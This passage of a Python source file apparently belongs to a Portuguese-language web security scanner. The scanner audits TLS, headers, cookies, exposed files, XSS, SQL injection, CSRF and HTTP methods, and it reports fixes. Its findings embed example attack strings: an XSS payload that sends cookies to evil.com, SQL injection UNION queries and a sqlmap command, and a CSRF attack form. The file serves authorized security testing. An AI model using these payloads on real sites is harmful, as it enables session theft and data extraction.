                f"{color(str(result.status).ljust(3), status_color(result.status), Cyber.BOLD)} "
                f"{color(result.url, Cyber.CYAN)}"
            )
    return method_results


def build_findings(
    url: str,
    status: int,
    headers: Mapping[str, str],
    parser: PageParser,
    methods: list[str],
    probes: list[Probe],
    tls_subject: str,
    tls_versions: list[TLSVersionResult] | None = None,
    xss_reflected: bool = False,
    xss_evidence: str = "",
    sqli_databases: list[str] | None = None,
    raw_headers: dict[str, list[str]] | None = None,
    method_results: list[MethodResult] | None = None,
    body_text: str = "",
) -> list[Finding]:
    """Gera lista de findings de seguranca baseado nos dados coletados.

    Verificacoes realizadas (em ordem):
    1. Transporte: HTTP vs HTTPS, versoes TLS fracas
    2. Headers: presenca de security headers (HSTS, CSP, X-Frame, etc.)
    3. Fingerprint: headers que revelam tecnologias (Server, X-Powered-By)
    4. CORS: configuracao permissiva (wildcard, credenciais)
    5. Cookies: flags HttpOnly, Secure, SameSite
    6. HTML: forms sem CSRF, scripts externos, comentarios
    7. Path probing: arquivos sensiveis encontrados (.env, .git, etc.)
    8. Vulnerabilidades: XSS refletido, SQLi error-based
    9. Metodos HTTP: PUT/DELETE/PATCH/TRACE aceitos
    """
    findings: list[Finding] = []
    parsed = urlparse(url)
    lower_headers = {key.lower(): value for key, value in headers.items()}

    if parsed.scheme == "http":
        findings.append(Finding(
            "high", "transport", "HTTP sem TLS",
            "A pagina principal respondeu sem HTTPS.",
            "Force HTTPS, redirecione HTTP para HTTPS e use HSTS.",
            f"curl -v {url}\n"
            f"Mitigacao: configure HTTPS + HSTS header:\n"
            f"  Strict-Transport-Security: max-age=31536000; includeSubDomains",
        ))
    elif not tls_subject:
        findings.append(Finding(
            "medium", "transport", "TLS nao validado pela ferramenta",
            "Nao foi possivel coletar certificado TLS.",
            "Verifique validade, cadeia, hostname e protocolos aceitos.",
            f"openssl s_client -connect {parsed.hostname}:{parsed.port or 443} -servername {parsed.hostname} </dev/null 2>/dev/null | openssl x509 -noout -dates -subject -issuer",
        ))

    if tls_versions:
        weak_versions = [tv for tv in tls_versions if tv.supported and tv.protocol in ("SSLv3", "TLS 1.0", "TLS 1.1")]
        for tv in weak_versions:
            findings.append(Finding(
                "high", "transport", f"Versao TLS obsoleta: {tv.protocol}",
                f"{tv.protocol} esta habilitado no servidor.",
                f"Desabilite {tv.protocol} e use no minimo TLS 1.2.",
                f"openssl s_client -connect {parsed.hostname}:{parsed.port or 443} -{tv.protocol.lower().replace(' ', '').replace('.', '')} </dev/null 2>/dev/null",
            ))

    for header, recommendation in SECURITY_HEADERS_RECS.items():
        if header not in lower_headers:
            exploit_cmd = f"curl -I {url} 2>/dev/null | grep -i '{header}'"
            findings.append(Finding(
                "medium", "headers", f"Header ausente: {header}",
                "Header nao apareceu na resposta principal.",
                recommendation,
                exploit_cmd,
            ))

    findings.extend(analyze_headers_findings(headers, raw_headers))

    server = header_get(headers, "server")
    if server:
        findings.append(Finding("low", "fingerprint", "Server exposto", server, "Reduza versao/banner quando possivel.",
                                f"curl -I {url} 2>/dev/null | grep -i server"))

    cors = header_get(headers, "access-control-allow-origin")
    if cors == "*":
        findings.append(Finding(
            "medium", "cors", "CORS permissivo",
            "Access-Control-Allow-Origin: *",
            "Restrinja origens permitidas e revise credenciais CORS.",
            f"curl -H \"Origin: http://evil.com\" -I {url} 2>/dev/null | grep -i access-control\n"
            f"# Teste com credenciais:\n"
            f"curl -H \"Origin: http://evil.com\" -H \"Cookie: session=abc\" {url}",
        ))

    cookies = (raw_headers or {}).get("set-cookie", [])
    for cookie in cookies:
        lowered = cookie.lower()
        missing = [flag for flag in ("httponly", "secure", "samesite") if flag not in lowered]
        if missing:
            findings.append(Finding(
                "medium", "cookies", "Cookie sem flags fortes",
                f"faltando: {', '.join(missing)}",
                "Use Secure, HttpOnly e SameSite em cookies sensiveis.",
                f"curl -v {url} 2>&1 | grep -i set-cookie\n"
                f"Cookie detectado: {cookie[:60]}...",
            ))

    dangerous_methods = [method for method in methods if method in {"PUT", "DELETE", "TRACE", "CONNECT"}]
    if dangerous_methods:
        curl_examples = "\n".join(
            f"  curl -X {m} {url}/test -d 'test'" if m in {"PUT", "DELETE"}
            else f"  curl -X {m} {url}"
            for m in dangerous_methods
        )
        findings.append(Finding(
            "high", "methods", "Metodos HTTP perigosos habilitados",
            ", ".join(dangerous_methods),
            "Desabilite metodos nao usados no servidor, proxy e aplicacao.",
            curl_examples,
        ))

    if parser.password_inputs and parsed.scheme == "http":
        findings.append(Finding(
            "critical", "auth", "Senha em pagina sem HTTPS",
            f"{parser.password_inputs} campo(s) password detectado(s).",
            "Nunca sirva formularios de autenticacao via HTTP.",
            f"curl -I {url} 2>/dev/null | grep -i 'type=\"password\"'\n"
            f"# Credenciais serao transmitidas em claro! Interceptacao trivial com mitmproxy/tcpdump.",
        ))
    elif parser.password_inputs:
        findings.append(Finding(
            "info", "auth", "Formulario de login detectado",
            f"{parser.password_inputs} campo(s) password detectado(s).",
            "Revise MFA, rate limit, lockout e protecao contra credential stuffing.",
            f"curl -s {url} | grep -i type=.password.\n"
            f"# Verifique protecao contra brute force (rate limit, lockout, CAPTCHA).",
        ))

    if parser.comments:
        findings.append(Finding(
            "low", "content", "Comentarios HTML presentes",
            parser.comments[0],
            "Remova comentarios com detalhes internos, rotas, tokens ou tecnologia.",
            f"curl -s {url} | grep -o '<!--.*-->'\n"
            f"# Inspecione o codigo fonte no browser (Ctrl+U) para ver todos os comentarios.",
        ))

    sensitive_hits = [
        probe for probe in probes
        if probe.status in {200, 401, 403} and any(token in probe.url for token in (".env", ".git", "dump", "backup", "config", "phpinfo", "actuator"))
    ]
    for probe in sensitive_hits:
        severity = "high" if probe.status == 200 else "medium"
        exploit_cmd = f"curl -s {probe.url}"
        if ".env" in probe.url:
            exploit_cmd += "\n# Possivel vazamento de chaves secretas, DB credentials, API keys"
        elif ".git" in probe.url:
            exploit_cmd += "\n# Possivel source code disclosure: git clone/extract do repositorio"
        elif "dump" in probe.url or "backup" in probe.url:
            exploit_cmd += "\n# Possivel vazamento de banco de dados ou codigo fonte"
        elif "phpinfo" in probe.url:
            exploit_cmd += "\n# Informacoes detalhadas do servidor: modulos, configs, paths"
        elif "actuator" in probe.url:
            exploit_cmd += "\n# Spring Boot Actuator: endpoints de gerenciamento expostos"
        findings.append(Finding(
            severity, "exposure", "Endpoint/arquivo sensivel exposto",
            f"{probe.status} {probe.url}",
            "Remova arquivos sensiveis do webroot e restrinja endpoints administrativos.",
            exploit_cmd,
        ))

    if 500 <= status < 600:
        body_snippet = body_text[:300].strip() if body_text else f"HTTP {status}"
        findings.append(Finding(
            "medium", "stability", "Erro 5xx na pagina principal",
            body_snippet,
            "Investigue logs e tratamento de erro para evitar vazamento e indisponibilidade.",
            f"curl -v {url}\n"
            f"# Verifique se a resposta contem stack traces ou informacoes internas.",
        ))

    if body_text:
        findings.extend(analyze_error_response(body_text))

    if xss_reflected:
        findings.append(Finding(
            "high", "xss", "Entrada refletida sem sanitizacao",
            xss_evidence,
            "Use encoding de saida (HTML entities) e CSP para mitigar XSS refletido.",
            f"# Payload basico:\n"
            f"curl \"{url}/?q=<script>alert(1)</script>\"\n"
            f"# Payload de exfiltracao:\n"
            f"curl \"{url}/?q=<script>document.location='http://evil.com/?c='+document.cookie</script>\"\n"
            f"# Verifique se o navegador executa o script.",
        ))

    if sqli_databases:
        findings.append(Finding(
            "critical", "sqli", "Possivel injecao SQL (error-based)",
            f"Banco detectado: {', '.join(sqli_databases)}",
            "Use queries parametrizadas/prepared statements e validacao de entrada.",
            f"# Payloads de deteccao:\n"
            f"  curl \"{url}/?id=1'\"\n"
            f"  curl \"{url}/?id=1' OR '1'='1\"\n"
            f"  curl \"{url}/?id=1 UNION SELECT NULL--\"\n"
            f"# Extracao de dados (MySQL):\n"
            f"  curl \"{url}/?id=1' UNION SELECT table_name FROM information_schema.tables--\"\n"
            f"# Ferramentas: sqlmap -u \"{url}/?id=1\" --dbs",
        ))

    missing_csrf = parser.forms_missing_csrf
    if missing_csrf > 0:
        findings.append(Finding(
            "medium", "csrf", "Formulario sem token CSRF",
            f"{missing_csrf} formulario(s) POST sem campo CSRF hidden.",
            "Adicione tokens CSRF em todos os formularios que modificam estado.",
            f"# Inspecione forms no browser (DevTools > Elements)\n"
            f"# Procure por <input type=\"hidden\" name=\"csrf\" ou similar>\n"
            f"# CSRF explora via formulário malicioso:\n"
            f"  <form method=\"POST\" action=\"{url}/endpoint\">\n"
            f"    <input type=\"hidden\" name=\"param\" value=\"malicious\">\n"
            f"    <input type=\"submit\">\n"
            f"  </form>",
        ))

    findings.extend(analyze_hidden_fields(parser.hidden_fields))

    if method_results:
        high_methods = [mr for mr in method_results if mr.status in {200, 201, 204} and mr.method in {"PUT", "DELETE", "TRACE"}]
        for mr in high_methods:
            severity = "high" if mr.method in {"PUT", "DELETE"} else "medium"
            recommendation = (
                "Restrinja metodos HTTP nao utilizados via servidor/proxy/WAF."
                if mr.method == "TRACE"
                else "Verifique autenticacao/autorizacao e restrinja metodos nao utilizados."
            )
            exploit_cmd = f"curl -X {mr.method} {mr.url}"
            if mr.method == "PUT":
                exploit_cmd += " -d 'test=1'"
            elif mr.method == "DELETE":
                exploit_cmd += "\n# Cuidado: pode deletar dados reais em producao!"
            findings.append(Finding(
                severity, "methods", f"Metodo {mr.method} aceito",
                f"{mr.status} {mr.url}",
                recommendation,
                exploit_cmd,
            ))

        medium_methods = [mr for mr in method_results if mr.status in {200, 201, 204} and mr.method == "PATCH"]
        for mr in medium_methods:
            findings.append(Finding(
                "medium", "methods", "Metodo PATCH aceito",
                f"{mr.status} {mr.url}",
                "Verifique autenticacao/autorizacao e restrinja metodos nao utilizados.",
                f"curl -X PATCH {mr.url} -d 'field=newvalue'",
            ))

    return findings


def risk_score(findings: list[Finding]) -> int:
    """Calcula score de risco somando pesos das severidades."""
    return sum(RISK_WEIGHTS.get(finding.severity, 0) for finding in findings)



async def run_audit(
    url: str,
    timeout: float,
    user_agent: str,
    threads: int,
    deep: bool,
    proxy: str | None = None,
    verify: bool = False,
    requests_per_second: float = 0.0,
    test_vulns: bool = False,
    test_methods: bool = False,
    auth: dict[str, str] | None = None,
    bearer_token: str | None = None,
    cookie: str | None = None,
    extra_headers: list[str] | None = None,
    paths: list[str] | None = None,
    inject_params: list[str] | None = None,
) -> AuditResult:
    """Executa auditoria completa em uma URL alvo."""
    started = time.monotonic()
    target = normalize_url(url)
    parsed = urlparse(target)
    ip = await resolve_ip(parsed.hostname or "")
    rate_limiter = RateLimiter(requests_per_second)
    client = create_async_client(user_agent=user_agent, proxy=proxy, verify=verify)
    apply_session_auth(client, auth=auth, bearer_token=bearer_token, cookie=cookie, extra_headers=extra_headers)

    logger.info("audit iniciado: %s", target)
    logger.debug("threads=%d, deep=%s, test_vulns=%s, test_methods=%s", threads, deep, test_vulns, test_methods)

    try:
        print(color("[*]", Cyber.CYAN, Cyber.BOLD), f"Alvo: {color(target, Cyber.WHITE, Cyber.BOLD)}")
        if ip:
            print(color("[*]", Cyber.CYAN, Cyber.BOLD), f"IP: {color(ip, Cyber.YELLOW)}")

        status, headers, body, raw_headers = await fetch(client, target, timeout=timeout, rate_limiter=rate_limiter)
        content_type = header_get(headers, "content-type")
        text = body.decode("utf-8", errors="replace") if "text/html" in content_type.lower() else ""
        parser = PageParser()
        if text:
            parser.feed(text)

        tls_subject, tls_issuer, tls_not_after = await tls_info(target, timeout)
        tls_versions = await check_tls_versions(target, timeout) if parsed.scheme == "https" else []
        methods = await parse_allowed_methods(client, target, timeout)
        probes = await scan_paths(client, rate_limiter, target, timeout, threads, paths=paths) if deep else []

        xss_reflected, xss_evidence = False, ""
        sqli_databases: list[str] | None = None
        method_results: list[MethodResult] | None = None

        vuln_tasks = []
        if test_vulns:
            print(color("[*]", Cyber.CYAN, Cyber.BOLD), "Testando XSS reflection e SQLi error-based em paralelo...")
            vuln_tasks.append(check_xss_reflection(client, target, timeout, inject_params=inject_params))
            vuln_tasks.append(check_sqli_errors(client, target, timeout, inject_params=inject_params))
        if test_methods and probes:
            print(color("[*]", Cyber.CYAN, Cyber.BOLD), "Testando metodos HTTP...")
            vuln_tasks.append(test_http_methods(client, probes, timeout, rate_limiter))

        if vuln_tasks:
            vuln_results = await asyncio.gather(*vuln_tasks, return_exceptions=True)
            task_idx = 0
            if test_vulns:
                xss_result = vuln_results[task_idx]
                task_idx += 1
                sqli_result = vuln_results[task_idx]
                task_idx += 1
                if isinstance(xss_result, BaseException):
                    xss_reflected, xss_evidence = False, ""
                else:
                    xss_reflected, xss_evidence = xss_result
                if xss_reflected:
                    print(color("[!]", Cyber.RED, Cyber.BOLD), "XSS refletido detectado!")
                sqli_databases = [] if isinstance(sqli_result, BaseException) else sqli_result
                if sqli_databases:
                    print(color("[!]", Cyber.RED, Cyber.BOLD), f"Erros SQL detectados: {', '.join(sqli_databases)}")
            if test_methods and probes:
                methods_result = vuln_results[task_idx]
                method_results = [] if isinstance(methods_result, BaseException) else methods_result
                if not method_results:
                    print(color("[*]", Cyber.CYAN, Cyber.BOLD), "Nenhum metodo perigoso aceito.")
    finally:
        await client.aclose()

    findings = build_findings(
        target, status, headers, parser, methods, probes, tls_subject,
        tls_versions=tls_versions, xss_reflected=xss_reflected,
        xss_evidence=xss_evidence, sqli_databases=sqli_databases,
        raw_headers=raw_headers, method_results=method_results,
        body_text=text,
    )

    return AuditResult(
        target=url,
        final_url=target,
        status=status,
        title=parser.title,
        ip=ip,
        tls_subject=tls_subject,
        tls_issuer=tls_issuer,
        tls_not_after=tls_not_after,
        allowed_methods=methods,
        forms=parser.forms,
        password_inputs=parser.password_inputs,
        probes=probes,
        findings=findings,
        risk_score=risk_score(findings),
        elapsed=time.monotonic() - started,
        tls_versions=tls_versions,
        xss_reflected=xss_reflected,
        sqli_errors=sqli_databases or [],
        csrf_missing=parser.forms_missing_csrf,
        method_results=method_results or [],
    )


def print_result(result: AuditResult) -> None:
    """Exibe resultado da auditoria formatado no terminal."""
    print()
    print(color("Resumo", Cyber.CYAN, Cyber.BOLD))
    print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} URL: {color(result.final_url, Cyber.WHITE, Cyber.BOLD)}")
    print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} Status: {color(str(result.status), status_color(result.status), Cyber.BOLD)} | Score: {color(str(result.risk_score), Cyber.YELLOW, Cyber.BOLD)} | Tempo: {color(f'{result.elapsed:.2f}s', Cyber.YELLOW)}")
    if result.title:
        print(f"{color('[T]', Cyber.MAGENTA, Cyber.BOLD)} Title: {color(result.title, Cyber.WHITE)}")
    if result.tls_subject:
        print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} TLS: {color(result.tls_subject, Cyber.GREEN)} | expira: {color(result.tls_not_after, Cyber.YELLOW)}")
    if result.tls_versions:
        weak = [tv for tv in result.tls_versions if tv.supported and tv.protocol in ("SSLv3", "TLS 1.0", "TLS 1.1")]
        strong = [tv for tv in result.tls_versions if tv.supported and tv.protocol in ("TLS 1.2", "TLS 1.3")]
        tls_status = color(", ".join(tv.protocol for tv in strong), Cyber.GREEN)
        if weak:
            tls_status += " | " + color(", ".join(tv.protocol for tv in weak), Cyber.RED, Cyber.BOLD)
        print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} TLS versions: {tls_status}")
    if result.allowed_methods:
        print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} Metodos: {color(', '.join(result.allowed_methods), Cyber.WHITE)}")
    print(f"{color('[*]', Cyber.CYAN, Cyber.BOLD)} Forms: {color(str(result.forms), Cyber.WHITE)} | Password inputs: {color(str(result.password_inputs), Cyber.WHITE)}")
    if result.xss_reflected:
        print(f"{color('[!]', Cyber.RED, Cyber.BOLD)} XSS refletido: {color('SIM', Cyber.RED, Cyber.BOLD)}")
    if result.sqli_errors:
        print(f"{color('[!]', Cyber.RED, Cyber.BOLD)} SQLi erros: {color(', '.join(result.sqli_errors), Cyber.RED, Cyber.BOLD)}")
    if result.csrf_missing:
        print(f"{color('[!]', Cyber.YELLOW, Cyber.BOLD)} CSRF ausente: {color(str(result.csrf_missing), Cyber.YELLOW)} formulario(s)")
    if result.method_results:
        print(color("\nHTTP Methods scan", Cyber.CYAN, Cyber.BOLD))
        for mr in result.method_results:
            marker = color("[+]", Cyber.GREEN, Cyber.BOLD) if mr.status in {200, 201, 204} else color("[-]", Cyber.YELLOW)
            print(
                f"  {marker} "
                f"{color(mr.method.ljust(7), Cyber.YELLOW, Cyber.BOLD)} "
                f"{color(str(mr.status).ljust(3), status_color(mr.status), Cyber.BOLD)} "
                f"{color(mr.url, Cyber.CYAN)}"
            )

    print(color("\nFindings red/blue", Cyber.CYAN, Cyber.BOLD))
    if not result.findings:
        print(color("Nenhum finding relevante com os checks atuais.", Cyber.GREEN))
        return

    for finding in sorted(result.findings, key=lambda item: -RISK_WEIGHTS.get(item.severity, 0)):
        sev = color(finding.severity.upper().ljust(8), severity_color(finding.severity), Cyber.BOLD)
        print(f"{sev} {color(finding.category.ljust(11), Cyber.GRAY)} {color(finding.item, Cyber.WHITE, Cyber.BOLD)}")
        print(f"         evidencia: {color(finding.evidence, Cyber.YELLOW)}")
        print(f"         defesa:    {color(finding.recommendation, Cyber.GREEN)}")
        if finding.exploit:
            for line in finding.exploit.split("\n"):
                print(f"         exploit:    {color(line, Cyber.RED)}")


def _save_audit_output(path: str, result: AuditResult, quiet: bool = False) -> None:
    """Salva resultado da auditoria em arquivo JSON ou CSV."""
    data = asdict(result)
    write_output(
        path,
        data,
        fieldnames=["severity", "category", "item", "evidence", "recommendation", "exploit"],
        csv_rows=data["findings"],
        quiet=quiet,
    )


def build_parser() -> argparse.ArgumentParser:
    """Constroi parser de argumentos da linha de comandos."""
    parser = argparse.ArgumentParser(
        description="Auditoria web red/blue para laboratorios e alvos autorizados."
    )
    add_common_args(parser)
    parser.add_argument("url", nargs="?", help="URL alvo. Ex: https://example.com")
    parser.add_argument("-l", "--list", dest="target_list", help="Arquivo com URLs alvo (uma por linha).")
    parser.add_argument("--output-dir", dest="output_dir", help="Diretorio para salvos individuais (hostname.json).")
    parser.add_argument("--concurrency", type=int, default=20, help="Concorrencia assincrona para probes de paths. Padrao: 20")
    parser.add_argument("--paths-file", dest="paths_file", help="Arquivo com paths customizados (um por linha). Ativa --deep automaticamente.")
    parser.add_argument("--deep", action="store_true", help="Ativa probes de arquivos/endpoints comuns.")
    parser.add_argument(
        "--test-vulns",
        action="store_true",
        help="Ativa testes de vulnerabilidade (XSS reflection, SQLi error-based).",
    )
    parser.add_argument(
        "--test-methods",
        action="store_true",
        help="Testa metodos HTTP perigosos (PUT, DELETE, PATCH, TRACE) nos endpoints.",
    )
    parser.add_argument(
        "--params",
        help="Query params para injecao XSS/SQLi (separado por virgula). Ex: --params 'q,id,search'",
    )
    parser.set_defaults(user_agent=f"Mozilla/5.0 (X11; Linux x86_64) AttackAudit/{__version__}")
    return parser


async def _run_single(url: str, args: argparse.Namespace, quiet: bool = False) -> AuditResult:
    """Executa auditoria em uma unica URL."""
    custom_paths = None
    if getattr(args, "paths_file", None):
        custom_paths = load_paths_from_file(args.paths_file)
    inject_params = None
    if getattr(args, "params", None):
        inject_params = [p.strip() for p in args.params.split(",") if p.strip()]
    result = await run_audit(
        url, args.timeout, args.user_agent, args.concurrency, args.deep,
        proxy=args.proxy, verify=getattr(args, "verify", False), requests_per_second=args.delay,
        test_vulns=args.test_vulns,
        test_methods=getattr(args, "test_methods", False),
        auth=getattr(args, "auth", None),
        bearer_token=getattr(args, "bearer_token", None),
        cookie=getattr(args, "cookie", None),
        extra_headers=getattr(args, "header", None),
        paths=custom_paths,
        inject_params=inject_params,
    )
    if not quiet:
        print_result(result)
    return result


async def _async_run_once(args: argparse.Namespace) -> int:
    """Executa uma unica auditoria (async)."""
    quiet = init_scanner(args)
    if getattr(args, "paths_file", None):
        args.deep = True
    if args.concurrency < 1:
        raise ValueError("concorrencia precisa ser maior que zero")

    urls = resolve_target_urls(args)
    output_dir = getattr(args, "output_dir", None)
    ensure_output_dir(output_dir)

    if getattr(args, "dry_run", False):
        print(color("[DRY-RUN]", Cyber.YELLOW, Cyber.BOLD), "Nenhuma requisicao HTTP sera enviada.")
        for url in urls:
            target = normalize_url(url)
            print(color("[*]", Cyber.CYAN, Cyber.BOLD), f"Alvo: {color(target, Cyber.WHITE, Cyber.BOLD)}")
            features = []
            if args.deep:
                features.append("path probing")
            if getattr(args, "test_vulns", False):
                features.append("XSS/SQLi tests")
            if getattr(args, "test_methods", False):
                features.append("HTTP method tests")
            if getattr(args, "params", None):
                features.append(f"params={args.params}")
            if features:
                print(color("[*]", Cyber.CYAN, Cyber.BOLD), f"Features: {color(', '.join(features), Cyber.WHITE, Cyber.BOLD)}")
        return 0

    all_results: list[AuditResult] = []
    for url in urls:
        result = await _run_single(url, args, quiet=quiet)
        all_results.append(result)
        if output_dir:
            hostname = extract_hostname(url)
            out_path = os.path.join(output_dir, f"{hostname}.json")
            _save_audit_output(out_path, result, quiet=quiet)

    if args.output:
        if len(all_results) == 1:
            _save_audit_output(args.output, all_results[0], quiet=quiet)
        else:
            consolidated = [asdict(r) for r in all_results]
            csv_rows = [f for r in all_results for f in asdict(r)["findings"]]
            write_output(args.output, consolidated, quiet=quiet, csv_rows=csv_rows,
                         fieldnames=["severity", "category", "item", "evidence", "recommendation", "exploit"])
    return 0


def run_once(args: argparse.Namespace) -> int:
    """Executa uma unica auditoria com os argumentos fornecidos."""
    return safe_asyncio_run(_async_run_once(args))


def main() -> int:
    """Ponto de entrada principal do AttackAudit."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner,
        run_fn=run_once,
        has_target=lambda a: bool(a.url or getattr(a, "target_list", None)),
        prompt="audit> ",
        description="AttackAudit interativo.",
        example="https://example.com --deep --test-vulns -o audit.json",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://example.com --deep\n"
            "  https://example.com --deep --test-vulns --test-methods\n"
            "  https://example.com --deep --test-vulns --params 'q,search,id'\n"
            "  https://example.com --paths-file custom.txt -o audit.json\n"
            "  -l targets.txt --output-dir results/"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
